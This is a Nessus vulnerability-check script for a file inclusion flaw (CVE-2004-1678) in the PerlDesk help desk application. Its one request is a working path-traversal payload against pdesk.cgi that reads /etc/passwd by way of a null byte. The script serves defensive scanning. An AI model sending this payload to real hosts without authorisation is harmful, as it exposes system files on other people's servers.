#
# (C) Tenable Network Security
#

if (description)
{
 script_id(14733);
 script_cve_id("CVE-2004-1678");
 script_bugtraq_id(11160);
 script_version("$Revision: 1.3 $");
 script_name(english:"PerlDesk File Inclusion");
 desc["english"] = "
The remote host is running PerlDesk, a web based help desk and email management
application written in perl.

There is a file inclusion issue in the remote version of this software
which may allow an attacker to read fragments of arbitrary files on the
remote host and to execute arbirary perl scripts, provided that an attacker
may upload a script in the first place.

Solution : Upgrade to the latest version of this software
Risk factor : Medium";

 script_description(english:desc["english"]);
 script_summary(english:"Determines if perldesk is vulnerable to a file inclusion");
 script_category(ACT_GATHER_INFO);
 script_family(english:"CGI abuses", francais:"Abus de CGI");
 script_copyright(english:"This script is Copyright (C) 2004 Tenable Network Security");
 script_dependencie("find_service.nes", "http_version.nasl");
 script_require_ports("Services/www", 80);
 exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");


port = get_http_port(default:80);

if(!get_port_state(port))exit(0);

req = http_get(item:"/cgi-bin/pdesk.cgi?lang=../../../../../../../../etc/passwd%00", port:port);
res = http_keepalive_send_recv(port:port, data:req);
if(res == NULL ) exit(0);
 
if('"*:0"' >< res && '"/bin/' >< res )
 {
    	security_warning(port);
	exit(0);
 }
